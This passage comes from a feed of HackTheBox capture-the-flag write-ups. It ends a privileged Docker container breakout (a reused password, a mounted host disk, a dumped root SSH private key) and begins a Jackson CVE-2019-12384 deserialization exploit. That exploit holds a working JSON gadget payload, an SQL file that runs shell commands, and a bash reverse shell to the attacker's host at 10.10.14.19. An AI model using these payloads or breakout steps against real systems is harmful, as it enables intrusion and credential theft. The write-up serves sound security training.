<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git@gitlab:/opt/backup$ ls -l
total <span style="color:#ae81ff">100</span>
-rw-r--r-- <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">872</span> Dec  <span style="color:#ae81ff">7</span> 09:25 docker-compose.yml
-rw-r--r-- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">15092</span> Dec  <span style="color:#ae81ff">1</span> 16:23 gitlab-secrets.json
-rw-r--r-- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">79639</span> Dec  <span style="color:#ae81ff">1</span> 19:20 gitlab.rb
</code></pre></div><p>Upon performing a recursive grep to search for files containing a &ldquo;pass&rdquo; string inside the folder, I discovered an SMTP password on <code>gitlab.rb</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git@gitlab:/opt/backup$ grep -Ri <span style="color:#e6db74">&#34;pass&#34;</span>
...&lt;SNIP&gt;...
gitlab.rb:gitlab_rails<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;smtp_password&#39;</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;wW59U!ZKMbG9+*#h&#34;</span>
...&lt;SNIP&gt;...
</code></pre></div><p>Looking into the <code>docker-compose.yml</code>, I see a potential vector for container breakout.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yaml" data-lang="yaml"><span style="color:#ae81ff">git@gitlab:/opt/backup$ cat docker-compose.yml </span>
<span style="color:#f92672">version</span>: <span style="color:#e6db74">&#39;2.4&#39;</span>

<span style="color:#f92672">services</span>:
  <span style="color:#f92672">web</span>:
    <span style="color:#f92672">image</span>: <span style="color:#e6db74">&#39;gitlab/gitlab-ce:11.4.7-ce.0&#39;</span>
    <span style="color:#f92672">restart</span>: <span style="color:#ae81ff">always</span>
    <span style="color:#f92672">hostname</span>: <span style="color:#e6db74">&#39;gitlab.example.com&#39;</span>
    <span style="color:#f92672">environment</span>:
      <span style="color:#f92672">GITLAB_OMNIBUS_CONFIG</span>: |<span style="color:#e6db74">
</span><span style="color:#e6db74">        external_url &#39;http://172.19.0.2&#39;
</span><span style="color:#e6db74">        redis[&#39;bind&#39;]=&#39;127.0.0.1&#39;
</span><span style="color:#e6db74">        redis[&#39;port&#39;]=6379
</span><span style="color:#e6db74">        gitlab_rails[&#39;initial_root_password&#39;]=File.read(&#39;/root_pass&#39;)</span>        
    <span style="color:#f92672">networks</span>:
      <span style="color:#f92672">gitlab</span>:
        <span style="color:#f92672">ipv4_address</span>: <span style="color:#ae81ff">172.19.0.2</span>
    <span style="color:#f92672">ports</span>:
      - <span style="color:#e6db74">&#39;5080:80&#39;</span>
      <span style="color:#75715e">#- &#39;127.0.0.1:5080:80&#39;</span>
      <span style="color:#75715e">#- &#39;127.0.0.1:50443:443&#39;</span>
      <span style="color:#75715e">#- &#39;127.0.0.1:5022:22&#39;</span>
    <span style="color:#f92672">volumes</span>:
      - <span style="color:#e6db74">&#39;./srv/gitlab/config:/etc/gitlab&#39;</span>
      - <span style="color:#e6db74">&#39;./srv/gitlab/logs:/var/log/gitlab&#39;</span>
      - <span style="color:#e6db74">&#39;./srv/gitlab/data:/var/opt/gitlab&#39;</span>
      - <span style="color:#e6db74">&#39;./root_pass:/root_pass&#39;</span>
    <span style="color:#f92672">privileged</span>: <span style="color:#66d9ef">true</span> <span style="color:#75715e"># ==&gt; Potential privesc vector</span>
    <span style="color:#f92672">restart</span>: <span style="color:#ae81ff">unless-stopped</span>
    <span style="color:#75715e">#mem_limit: 1024m</span>

<span style="color:#f92672">networks</span>:
  <span style="color:#f92672">gitlab</span>:
    <span style="color:#f92672">driver</span>: <span style="color:#ae81ff">bridge</span>
    <span style="color:#f92672">ipam</span>:
      <span style="color:#f92672">config</span>:
        - <span style="color:#f92672">subnet</span>: <span style="color:#ae81ff">172.19.0.0</span><span style="color:#ae81ff">/16</span>
</code></pre></div><h4 id="su---root-container">su - root (container)</h4>
<p>The password <code>wW59U!ZKMbG9+*#h</code> works on the container root account</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">git@gitlab:/opt/gitlab$ su root
Password: wW59U!ZKMbG9+*#h
root@gitlab:/opt/gitlab# id
uid=0(root) gid=0(root) groups=0(root)
</code></pre></div><h4 id="docker-breakout">Docker Breakout</h4>
<p>Based on the <code>docker-compose.yml</code> file, I suspect the container is running with privileged flag. According to my favorite blog, which is <a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#">BookHackTrick</a>, a container with privileged flag will have access to the host devices.</p>
<p>Although, <code>--privileged</code> gives all the Linux capabilities, I&rsquo;ll still check it manually to make sure I have access to the host devices.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">root@gitlab:/opt/gitlab# capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37+eip
...&lt;SNIP&gt;...
</code></pre></div><p>There is a <code>CAP_SYS_ADMIN</code>, with this capabilities I&rsquo;m able to mount the host devices to make it available on the container. I can list all the host devices with <code>fdisk -l</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">root@gitlab:~# fdisk -l

...&lt;SNIP&gt;...
Disk /dev/sda: 20 GiB, 21474836480 bytes, 41943040 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: gpt
Disk identifier: 32558524-85A4-4072-AA28-FA341BE86C2E

Device        Start      End  Sectors Size Type
/dev/sda1      2048     4095     2048   1M BIOS boot
/dev/sda2      4096 37746687 37742592  18G Linux filesystem # the root (/) dir
/dev/sda3  37746688 41940991  4194304   2G Linux swap
</code></pre></div><p>Now I can simply mount the Linux filesystem (<code>/dev/sda2</code>) to my specified folder.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">root@gitlab:/media# mkdir iamf
root@gitlab:/media# mount /dev/sda2 /media/iamf
root@gitlab:/media# ls iamf/
bin   cdrom  etc   lib    lib64   lost+found  mnt  proc  run   snap  sys  usr
boot  dev    home  lib32  libx32  media       opt  root  sbin  srv   tmp  var
</code></pre></div><p>The root user of the host has SSH keys, I’ll grab only the private key to my machine.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">root@gitlab:/media# ls -l iamf/root/.ssh/ 
total 12
-rw------- 1 root root  405 Dec  7 16:49 authorized_keys
-rw------- 1 root root 1675 Dec  7 16:49 id_rsa
-rw-r--r-- 1 root root  405 Dec  7 16:49 id_rsa.pub
root@gitlab:/media# cat iamf/root/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAvyovfg++zswQT0s4YuKtqxOO6EhG38TR2eUaInSfI1rjH09Q
sle1ivGnwAUrroNAK48LE70Io13DIfE9rxcotDviAIhbBOaqMLbLnfnnCNLApjCn
6KkYjWv+9kj9shzPaN1tNQLc2Rg39pn1mteyvUi2pBfA4ItE05F58WpCgh9KNMlf
YmlPwjeRaqARlkkCgFcHFGyVxd6Rh4ZHNFjABd8JIl+Yaq/pg7t4qPhsiFsMwntX
TBKGe8T4lzyboBNHOh5yUAI3a3Dx3MdoY+qXS/qatKS2Qgh0Ram2LLFxib9hR49W
rG87jLNt/6s06z+Mwf7d/oN8SmCiJx3xHgFzbwIDAQABAoIBACeFZC4uuSbtv011
YqHm9TqSH5BcKPLoMO5YVA/dhmz7xErbzfYg9fJUxXaIWyCIGAMpXoPlJ90GbGof
Ar6pDgw8+RtdFVwtB/BsSipN2PrU/2kcVApgsyfBtQNb0b85/5NRe9tizR/Axwkf
iUxK3bQOTVwdYQ3LHR6US96iNj/KNru1E8WXcsii5F7JiNG8CNgQx3dzve3Jzw5+
lg5bKkywJcG1r4CU/XV7CJH2SEUTmtoEp5LpiA2Bmx9A2ep4AwNr7bd2sBr6x4ab
VYYvjQlf79/ANRXUUxMTJ6w4ov572Sp41gA9bmwI/Er2uLTVQ4OEbpLoXDUDC1Cu
K4ku7QECgYEA5G3RqH9ptsouNmg2H5xGZbG5oSpyYhFVsDad2E4y1BIZSxMayMXL
g7vSV+D/almaACHJgSIrBjY8ZhGMd+kbloPJLRKA9ob8rfxzUvPEWAW81vNqBBi2
3hO044mOPeiqsHM/+RQOW240EszoYKXKqOxzq/SK4bpRtjHsidSJo4ECgYEA1jzy
n20X43ybDMrxFdVDbaA8eo+og6zUqx8IlL7czpMBfzg5NLlYcjRa6Li6Sy8KNbE8
kRznKWApgLnzTkvupk/oYSijSliLHifiVkrtEY0nAtlbGlgmbwnW15lwV+d3Ixi1
KNwMyG+HHZqChNkFtXiyoFaDdNeuoTeAyyfwzu8CgYAo4L40ORjh7Sx38A4/eeff
Kv7dKItvoUqETkHRA6105ghAtxqD82GIIYRy1YDft0kn3OQCh+rLIcmNOna4vq6B
MPQ/bKBHfcCaIiNBJP5uAhjZHpZKRWH0O/KTBXq++XQSP42jNUOceQw4kRLEuOab
dDT/ALQZ0Q3uXODHiZFYAQKBgBBPEXU7e88QhEkkBdhQpNJqmVAHMZ/cf1ALi76v
DOYY4MtLf2dZGLeQ7r66mUvx58gQlvjBB4Pp0x7+iNwUAbXdbWZADrYxKV4BUUSa
bZOheC/KVhoaTcq0KAu/nYLDlxkv31Kd9ccoXlPNmFP+pWWcK5TzIQy7Aos5S2+r
ubQ3AoGBAIvvz5yYJBFJshQbVNY4vp55uzRbKZmlJDvy79MaRHdz+eHry97WhPOv
aKvV8jR1G+70v4GVye79Kk7TL5uWFDFWzVPwVID9QCYJjuDlLBaFDnUOYFZW52gz
vJzok/kcmwcBlGfmRKxlS0O6n9dAiOLY46YdjyS8F8hNPOKX6rCd
-----END RSA PRIVATE KEY-----
</code></pre></div><h4 id="ssh-access---root-host">SSH Access - root (host)</h4>
<p>After changing the key permissions to 600, I can login as root user.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@kali «ssh-key» «10.10.14.20» 
$ chmod 600 root_rsa 
→ root@kali «ssh-key» «10.10.14.20» 
$ ssh -i root_rsa root@10.10.10.220
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)

...&lt;SNIP&gt;..
  System load:                      0.05
  Usage of /:                       67.1% of 17.59GB
  Memory usage:                     84%
  Swap usage:                       4%
  Processes:                        434
  Users logged in:                  0
  IPv4 address for br-bcb73b090b3f: 172.19.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for ens160:          10.10.10.220
  IPv6 address for ens160:          dead:beef::250:56ff:feb9:211

...&lt;SNIP&gt;..
Last login: Thu Feb 11 14:28:18 2021
root@ready:~# id
uid=0(root) gid=0(root) groups=0(root)
root@ready:~# ls -l
total 16
drwxr-xr-x  3 root root 4096 Dec  1 12:41 docker-gitlab
drwxr-xr-x 10 root root 4096 Jul  9  2020 ready-channel
-r--------  1 root root   33 Jul  8  2020 root.txt
drwxr-xr-x  3 root root 4096 May 18  2020 snap
</code></pre></div><p>I can also grab the root flag.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">root@ready:~# cut -c-15 root.txt 
b7f98681505cd39
</code></pre></div><hr>
<h2 id="references">References</h2>
<ul>
<li><a href="https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/">https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/</a></li>
<li><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities">https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Time</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-time/</link>
      <pubDate>Sun, 09 May 2021 05:43:58 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-time/</guid>
      <description>Deserialization attack on Jackson library</description>
      <content:encoded><![CDATA[<p>Time is a medium difficulty Linux machine from HackTheBox that features a web application which provides JSON beautifier and validator services. Testing some invalid inputs exposes the application error message, indicating it backed with Jackson library. Searching for the error message on Google leads to a research blog about deserialization on Jackson. After reproducing the steps from the blog, I&rsquo;m able to gain a foothold on the box. Enumerating the files discovers a timer script that is executed by the root user every 10 seconds. The script is world-writable, allowing me to inject a malicious code and obtain a root shell.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>Deserialization Attack</li>
<li>Mitigation CVE-2019-12384</li>
<li>Exploiting Systemd timers</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p><code>nmap</code> discovers two open ports: SSH on port 22, and a HTTP web server on port 80.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «time» «10.10.14.19» 
$ mkdir nmap; nmap -sC -sV -oA nmap/10-initial-time 10.10.10.214 
Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-05-08 07:29 EDT
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.214
Host is up <span style="color:#f92672">(</span>0.069s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">998</span> closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
80/tcp open  http    Apache httpd 2.4.41 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
|_http-title: Online JSON parser
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 27.18 seconds
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>Visiting port 80 shows a website called &ldquo;Online JSON Beautifier &amp; Validator&rdquo;.</p>
<p><div class="img-container"><img src="imgs/image-20210508184016068.png" alt="image-20210508184016068"  /></div>
</p>
<p>Clicking on the drop down menu, it provides two options: &ldquo;Beautify&rdquo; and &ldquo;Validate (beta!)&rdquo;.</p>
<p><div class="img-container"><img src="imgs/image-20210508184059429.png" alt="image-20210508184059429"  /></div>
</p>
<h4 id="testing-inputs">Testing Inputs</h4>
<p>I submitted <code>{&quot;test&quot;: &quot;iamf&quot;}</code> to the input box and clicked the &ldquo;Process&rdquo; button. As expected, the beautify option just a JSON beautifier like <a href="https://stedolan.github.io/jq/">jq</a>.</p>
<p><div class="img-container"><img src="imgs/image-20210508184420130.png" alt="image-20210508184420130"  /></div>
</p>
<p>I submitted the same input on &ldquo;Validate (beta!)&rdquo;, but this time it returns the following error.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210508184904577.png" alt="image-20210508184904577"  /></div>
</p>
<p>I found this <a href="https://www.baeldung.com/jackson-inheritance#1-global-default-typing">site</a> while searching for the error message on Google. It turned out it wanted an array input, so I copied the sample input from that site and pasted it to the validator.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">[ 
<span style="color:#e6db74">&#34;org.baeldung.jackson.inheritance.Truck&#34;</span>,
{ <span style="color:#f92672">&#34;make&#34;</span>: <span style="color:#e6db74">&#34;Isuzu&#34;</span>, <span style="color:#f92672">&#34;model&#34;</span>: <span style="color:#e6db74">&#34;NQR&#34;</span>,<span style="color:#f92672">&#34;payloadCapacity&#34;</span>: <span style="color:#ae81ff">7500.0</span> }
]
</code></pre></div><p>And now it returns a different error message.</p>
<p><div class="img-container"><img src="imgs/image-20210508195850042.png" alt="image-20210508195850042"  /></div>
</p>
<p>And that&rsquo;s because it probably can&rsquo;t find <code>org.baeldung.jackson.inheritance.Truck</code> since I made it up.</p>
<h4 id="finding-vulnerability">Finding Vulnerability</h4>
<p>I might be able to inject the &ldquo;<code>org.baeldung.jackson.inheritance.Truck</code>&rdquo; with a java gadget class for deserialization attack, and after searching around about deserialization topics on Jackson, I found this two blog posts about Jackson RCE:</p>
<ul>
<li><a href="https://adamcaudill.com/2017/10/04/exploiting-jackson-rce-cve-2017-7525/">Exploiting the Jackson RCE: CVE-2017-7525 - Adam Caudill</a></li>
<li><a href="https://blog.doyensec.com/2019/07/22/jackson-gadgets.html">Jackson gadgets - Anatomy of a vulnerability · Doyensec&rsquo;s Blog</a></li>
</ul>
<p>However, the post on Doyensec&rsquo;s blog is newer (2019 vs 2017), so I dig into that blog. The researcher on that blog uses <code>ch.qos.logback.core.db.DriverManagerConnectionSource</code> as his gadget class, leveraging the alias feature from the H2 database to execute arbitrary code. This research is classified as CVE-2019-12384.</p>
<p>Below is the example payload used.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">[<span style="color:#e6db74">&#34;ch.qos.logback.core.db.DriverManagerConnectionSource&#34;</span>, {<span style="color:#f92672">&#34;url&#34;</span>:<span style="color:#e6db74">&#34;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#39;http://localhost:8000/inject.sql&#39;&#34;</span>}]
</code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-pericles">Shell as pericles</h3>
<h4 id="exploiting-jackson-cve-2019-12384">Exploiting Jackson CVE-2019-12384</h4>
<p>I&rsquo;ll use the research from Doyensec&rsquo;s blog above as my reference.</p>
<p>First, I&rsquo;ll create a copy of the <code>inject.sql</code> file that is used by the researcher.</p>
<p><code>inject.sql</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">CREATE ALIAS SHELLEXEC AS $$ String <span style="color:#a6e22e">shellexec</span><span style="color:#f92672">(</span>String cmd<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> java<span style="color:#f92672">.</span><span style="color:#a6e22e">io</span><span style="color:#f92672">.</span><span style="color:#a6e22e">IOException</span> <span style="color:#f92672">{</span>
	String<span style="color:#f92672">[]</span> command <span style="color:#f92672">=</span> <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;bash&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;-c&#34;</span><span style="color:#f92672">,</span> cmd<span style="color:#f92672">};</span>
	java<span style="color:#f92672">.</span><span style="color:#a6e22e">util</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Scanner</span> s <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> java<span style="color:#f92672">.</span><span style="color:#a6e22e">util</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Scanner</span><span style="color:#f92672">(</span>Runtime<span style="color:#f92672">.</span><span style="color:#a6e22e">getRuntime</span><span style="color:#f92672">().</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">(</span>command<span style="color:#f92672">).</span><span style="color:#a6e22e">getInputStream</span><span style="color:#f92672">()).</span><span style="color:#a6e22e">useDelimiter</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;\\A&#34;</span><span style="color:#f92672">);</span>
	<span style="color:#66d9ef">return</span> s<span style="color:#f92672">.</span><span style="color:#a6e22e">hasNext</span><span style="color:#f92672">()</span> <span style="color:#f92672">?</span> s<span style="color:#f92672">.</span><span style="color:#a6e22e">next</span><span style="color:#f92672">()</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">;</span>  <span style="color:#f92672">}</span>
$$<span style="color:#f92672">;</span>
CALL <span style="color:#a6e22e">SHELLEXEC</span><span style="color:#f92672">(</span><span style="color:#960050;background-color:#1e0010">&#39;</span>id <span style="color:#f92672">&gt;</span> <span style="color:#f92672">/</span>dev<span style="color:#f92672">/</span>tcp<span style="color:#f92672">/</span>10<span style="color:#f92672">.</span><span style="color:#a6e22e">10</span><span style="color:#f92672">.</span><span style="color:#a6e22e">14</span><span style="color:#f92672">.</span><span style="color:#a6e22e">19</span><span style="color:#f92672">/</span>9000<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">)</span>
</code></pre></div><p>Then, I&rsquo;ll setup a Python web server to host the SQL file and an <code>nc</code> listener to catch the request.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «time» «10.10.14.19» 
$ python3 -m http.server <span style="color:#ae81ff">80</span>
Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">80</span> <span style="color:#f92672">(</span>http://0.0.0.0:80/<span style="color:#f92672">)</span> ...
</code></pre></div><p>Now I&rsquo;ll use the following JSON payload and submit it to the validator.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">[<span style="color:#e6db74">&#34;ch.qos.logback.core.db.DriverManagerConnectionSource&#34;</span>, {<span style="color:#f92672">&#34;url&#34;</span>:<span style="color:#e6db74">&#34;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#39;http://10.10.14.19/inject.sql&#39;&#34;</span>}]
</code></pre></div><p>Within a few seconds, my Python web server receives a request for <code>inject.sql</code>, and my listener captures the output of the <code>id</code> command.</p>
<p><div class="img-container"><img src="imgs/image-20210508204955144.png" alt="image-20210508204955144"  /></div>
</p>
<p>Knowing this, I can weaponize the <code>inject.sql</code> file to send myself a shell, and then perform the same procedure as above.</p>
<h4 id="weaponization---reverse-shell">Weaponization - Reverse Shell</h4>
<p>Now with the following <code>inject.sql</code>,</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">CREATE ALIAS SHELLEXEC AS $$ String <span style="color:#a6e22e">shellexec</span><span style="color:#f92672">(</span>String cmd<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> java<span style="color:#f92672">.</span><span style="color:#a6e22e">io</span><span style="color:#f92672">.</span><span style="color:#a6e22e">IOException</span> <span style="color:#f92672">{</span>
	String<span style="color:#f92672">[]</span> command <span style="color:#f92672">=</span> <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;bash&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;-c&#34;</span><span style="color:#f92672">,</span> cmd<span style="color:#f92672">};</span>
	java<span style="color:#f92672">.</span><span style="color:#a6e22e">util</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Scanner</span> s <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> java<span style="color:#f92672">.</span><span style="color:#a6e22e">util</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Scanner</span><span style="color:#f92672">(</span>Runtime<span style="color:#f92672">.</span><span style="color:#a6e22e">getRuntime</span><span style="color:#f92672">().</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">(</span>command<span style="color:#f92672">).</span><span style="color:#a6e22e">getInputStream</span><span style="color:#f92672">()).</span><span style="color:#a6e22e">useDelimiter</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;\\A&#34;</span><span style="color:#f92672">);</span>
	<span style="color:#66d9ef">return</span> s<span style="color:#f92672">.</span><span style="color:#a6e22e">hasNext</span><span style="color:#f92672">()</span> <span style="color:#f92672">?</span> s<span style="color:#f92672">.</span><span style="color:#a6e22e">next</span><span style="color:#f92672">()</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">;</span>  <span style="color:#f92672">}</span>
$$<span style="color:#f92672">;</span>
CALL <span style="color:#a6e22e">SHELLEXEC</span><span style="color:#f92672">(</span><span style="color:#960050;background-color:#1e0010">&#39;</span>bash <span style="color:#f92672">-</span>i <span style="color:#f92672">&gt;&amp;</span> <span style="color:#f92672">/</span>dev<span style="color:#f92672">/</span>tcp<span style="color:#f92672">/</span>10<span style="color:#f92672">.</span><span style="color:#a6e22e">10</span><span style="color:#f92672">.</span><span style="color:#a6e22e">14</span><span style="color:#f92672">.</span><span style="color:#a6e22e">19</span><span style="color:#f92672">/</span>9000 0<span style="color:#f92672">&gt;&amp;</span>1<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">)</span>
</code></pre></div><p>I can obtain an interactive shell.</p>
<pre><code>→ root@kali «time» «10.10.14.19» 
$ nc -nvlp 9000            
listening on [any] 9000 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.10.214] 42496
bash: cannot set terminal process group (944): Inappropriate ioctl for device
bash: no job control in this shell
pericles@time:/var/www/html$ 
</code></pre><p><div class="img-container"><img src="imgs/image-20210508205643332.png" alt="image-20210508205643332"  /></div>
</p>
<h4 id="upgrade-to-ssh">Upgrade to SSH</h4>
<p>With current access, I can put my public key to the <code>authorized_keys</code> file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pericles@time:/home/pericles$ mkdir .ssh
pericles@time:/home/pericles$
pericles@time:/home/pericles$ echo <span style="color:#e6db74">&#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPmWTx2r3W2mHnCnKmoJCnkrj6mXxSIGq3E5ks1g+moK&#39;</span> &gt; .ssh/authorized_keys
</code></pre></div><p>Now I can login as <code>pericles</code> with my SSH private key.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «time» «10.10.14.19» 
$ ssh pericles@10.10.10.214 
Welcome to Ubuntu 20.04 LTS <span style="color:#f92672">(</span>GNU/Linux 5.4.0-52-generic x86_64<span style="color:#f92672">)</span>

...&lt;SNIP&gt;...
  System load:             0.0
  Usage of /:              21.2% of 27.43GB
  Memory usage:            16%
  Swap usage:              0%
  Processes:               <span style="color:#ae81ff">235</span>
  Users logged in:         <span style="color:#ae81ff">0</span>
  IPv4 address <span style="color:#66d9ef">for</span> ens160: 10.10.10.214
  IPv6 address <span style="color:#66d9ef">for</span> ens160: dead:beef::250:56ff:feb9:a553

...&lt;SNIP&gt;...
Last login: Fri Oct <span style="color:#ae81ff">23</span> 09:19:19 <span style="color:#ae81ff">2020</span> from 10.10.14.5
pericles@time:~$ id
uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>pericles<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>pericles<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>pericles<span style="color:#f92672">)</span>
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="internal-enumeration">Internal Enumeration</h4>
<p><code>pericles</code> is the only user on this box.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pericles@time:/home/pericles$ cat /etc/passwd | grep sh$
cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
pericles:x:1000:1000:Pericles:/home/pericles:/bin/bash
</code></pre></div><p>While searching a files owned by <code>pericles</code>, I spotted a script called <code>timer_backup.sh</code>.</p>
